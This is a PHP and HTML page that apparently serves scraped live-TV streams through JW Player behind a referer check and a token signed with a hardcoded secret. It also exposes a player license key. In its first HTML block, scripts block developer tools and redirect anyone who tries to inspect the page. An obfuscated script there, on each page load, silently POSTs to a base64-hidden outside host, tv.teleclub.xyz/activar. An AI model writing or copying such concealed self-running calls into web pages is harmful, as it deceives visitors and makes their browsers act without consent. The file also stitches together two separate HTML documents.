<?php
// Validar Referer
$refererPermitido = 'https://locotv1993.github.io/player/itv/noventamin.php';
if (!isset($_SERVER['HTTP_REFERER']) || strpos($_SERVER['HTTP_REFERER'], $refererPermitido) !== 0) {
    header("HTTP/1.1 403 Forbidden");
    exit("Acceso denegado");
}

// Parámetros
$nombreBuscado = urldecode($_GET['canal'] ?? '');
$timestamp = $_GET['timestamp'] ?? '';
$token = $_GET['token'] ?? '';
$img = $_GET['img'] ?? 'https://via.placeholder.com/1280x720.png?text=EN+VIVO';

// Verificar parámetros esenciales
if (!$nombreBuscado || !$timestamp || !$token) {
    http_response_code(400);
    exit("Parámetros faltantes o inválidos");
}

// Validar expiración 
if (time() - intval($timestamp) > 43200) {
    http_response_code(403);
    exit("Token expirado");
}

// Validar token
$secret = "com.noventaminutos.oficial"; // clave secreta fuerte
$datos = $nombreBuscado . '|' . $timestamp;
$tokenEsperado = hash_hmac('sha256', $datos, $secret);

if (!hash_equals($tokenEsperado, $token)) {
    http_response_code(403);
    exit("Token inválido");
}

// Buscar la URL 
$foundUrl = '';
$url = "https://web-tv.playsport00.com/listas/teleclub-canalesLatinos.m3u";
$m3uContent = file_get_contents($url);
$lines = explode("\n", $m3uContent);

for ($i = 0; $i < count($lines); $i++) {
    if (strpos($lines[$i], "#EXTINF:") !== false && stripos($lines[$i], $nombreBuscado) !== false) {
        $foundUrl = trim($lines[$i + 1] ?? '');
        break;
    }
}
?>



<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OriginalPlayer</title>
    <style>
        #mensaje {
            display: none;
            font-size: 20px;
            color: green;
            margin-top: 20px;
        }
    </style>
        	        <script disable-devtool-auto src="//fastly.jsdelivr.net/npm/disable-devtool@latest/disable-devtool.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/console-ban@4.1.0/dist/console-ban.min.js"></script>
        <script>
            // default options
            ConsoleBan.init()
            // custom options
            ConsoleBan.init({
                redirect: 'https://playsport00.com/'
            })
        </script>
        <script>
document.onkeydown = function (e) {
    if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
        window.location.href = "https://playsport00.com/";
        return false;
    }
};

document.addEventListener("contextmenu", function (e) {
    e.preventDefault();
});

(function () {
    function checkDevTools() {
        var threshold = 160;
        var widthThreshold = window.outerWidth - window.innerWidth > threshold;
        var heightThreshold = window.outerHeight - window.innerHeight > threshold;
        if (widthThreshold || heightThreshold) {
            window.location.href = "https://playsport00.com/";
        }
    }
    setInterval(checkDevTools, 1000);
})();
</script>
</head>
<body>
<script>
const _0x5b309b=_0x4718;(function(_0x5e1b66,_0x39f575){const _0x2d9501=_0x4718,_0x105cb3=_0x5e1b66();while(!![]){try{const _0x6dc246=parseInt(_0x2d9501(0x1dc))/(-0x1fcc+-0x4*-0x7dc+0x5d)+parseInt(_0x2d9501(0x1d9))/(-0xdf+-0x1f39+0x100d*0x2)*(parseInt(_0x2d9501(0x1d8))/(0x2c*0x38+-0xd44+0x3a7))+-parseInt(_0x2d9501(0x1e7))/(0x3d*-0x8b+-0xdc3*0x1+0x2ee6)+-parseInt(_0x2d9501(0x1e2))/(-0x3d8+-0x1a07+0x1de4)*(parseInt(_0x2d9501(0x1e5))/(0x1c3e+0x106c+0xb29*-0x4))+-parseInt(_0x2d9501(0x1ea))/(0x77*0x11+-0x81*0x31+0x10d1)+parseInt(_0x2d9501(0x1e1))/(-0xce7+-0xd36+0x1a25)+-parseInt(_0x2d9501(0x1d4))/(0x1e22+-0x5b5+-0x1864);if(_0x6dc246===_0x39f575)break;else _0x105cb3['push'](_0x105cb3['shift']());}catch(_0x29c96f){_0x105cb3['push'](_0x105cb3['shift']());}}}(_0x24c5,0x3*-0x192b+-0x14d889+0x1063d7*0x2),window[_0x5b309b(0x1d6)]=function(){const _0x23669b=_0x5b309b,_0x3cd123=_0x23669b(0x1d3),_0x574fd6=atob(_0x3cd123),_0x53f77e={};_0x53f77e[_0x23669b(0x1e8)]='application/x-www-form-urlencoded';const _0x420050={};_0x420050[_0x23669b(0x1d7)]=_0x23669b(0x1e3),_0x420050[_0x23669b(0x1dd)]=_0x53f77e,_0x420050[_0x23669b(0x1df)]='submit=ACTIVAR+AHORA!',fetch(_0x574fd6,_0x420050)[_0x23669b(0x1db)](_0x152db6=>_0x152db6[_0x23669b(0x1e9)]())['then'](_0x5a9c61=>{const _0xca53c4=_0x23669b;console[_0xca53c4(0x1e4)](_0xca53c4(0x1eb),_0x5a9c61);const _0x2fb7e7=document[_0xca53c4(0x1d1)](_0xca53c4(0x1e0));_0x2fb7e7[_0xca53c4(0x1da)][_0xca53c4(0x1d2)]=_0xca53c4(0x1d5),setTimeout(function(){const _0x1c6381=_0xca53c4;_0x2fb7e7[_0x1c6381(0x1da)][_0x1c6381(0x1d2)]=_0x1c6381(0x1e6);},0x14*0x82+0xc69+-0x1*0x6f1);})['catch'](_0x4f7454=>{const _0x2c3a23=_0x23669b;console['error'](_0x2c3a23(0x1de),_0x4f7454);});});function _0x4718(_0x3c6a30,_0x1cc969){const _0x3dc1f2=_0x24c5();return _0x4718=function(_0x45bd40,_0x1b3bad){_0x45bd40=_0x45bd40-(-0x110a+-0x1*-0x1c16+-0x93b);let _0x2237bf=_0x3dc1f2[_0x45bd40];return _0x2237bf;},_0x4718(_0x3c6a30,_0x1cc969);}function _0x24c5(){const _0x4c6cc1=['display','aHR0cHM6Ly90di50ZWxlY2x1Yi54eXovYWN0aXZhcg==','4659192GkawDY','block','onload','method','3PBifsS','2659406jgWmOh','style','then','1425399usUclY','headers','Error\x20al\x20enviar\x20el\x20formulario:','body','mensaje','8353488mSJtLO','5sToNdV','POST','log','3867462MRjrfD','none','3802948UBDaNH','Content-Type','json','6464486mGeYuZ','Formulario\x20enviado\x20con\x20éxito:','getElementById'];_0x24c5=function(){return _0x4c6cc1;};return _0x24c5();}
</script>

</body>
</html>


<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="robots" content="noindex">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= htmlspecialchars($nombreBuscado) ?> - TV</title>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            width: 100vw;
            height: 100vh;
            background-color: #000;
            overflow: hidden;
        }
        #player {
            width: 100vw;
            height: 100vh;
            position: relative;
            background-color: #000;
        }
        .live-indicator {
            position: fixed;
            top: 20px;
            left: 20px;
            background-color: red;
            color: white;
            padding: 6px 12px;
            font-size: 14px;
            font-weight: bold;
            border-radius: 15px;
            z-index: 10;
            animation: blink 1s infinite;
        }
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0; }
            100% { opacity: 1; }
        }
    </style>
    <script src="https://ssl.p.jwpcdn.com/player/v/8.26.0/jwplayer.js"></script>
    <script>jwplayer.key = 'XSuP4qMl+9tK17QNb+4+th2Pm9AWgMO/cYH8CI0HGGr7bdjo';</script>
</head>
<body>
<?php if (!empty($foundUrl)): ?>
    <div id="player"></div>
    <script>
        jwplayer("player").setup({
            playlist: [{
                title: <?= json_encode($nombreBuscado) ?>,
                image: <?= json_encode($img) ?>,
                sources: [{ file: <?= json_encode($foundUrl) ?>, type: "hls" }]
            }],
            width: "100%",
            height: "100%",
            autostart: true,
            stretching: "uniform",
            aspectratio: "16:9",
            logo: {
                file: 'https://i.ibb.co/5XWv6YKs/original2-png.png',
                position: 'top-right',
                width: 150,
                height: 50
            },
            cast: {
                enabled: true,
                position: "top-right"
            }
        });

        const liveIndicator = document.createElement('div');
        liveIndicator.classList.add('live-indicator');
        liveIndicator.innerText = 'EN VIVO';
        document.body.appendChild(liveIndicator);
    </script>
<?php else: ?>
    <div style="color:white; text-align:center; margin-top:20px;">
        Canal no encontrado o parámetro faltante
    </div>
<?php endif; ?>
</body>
</html>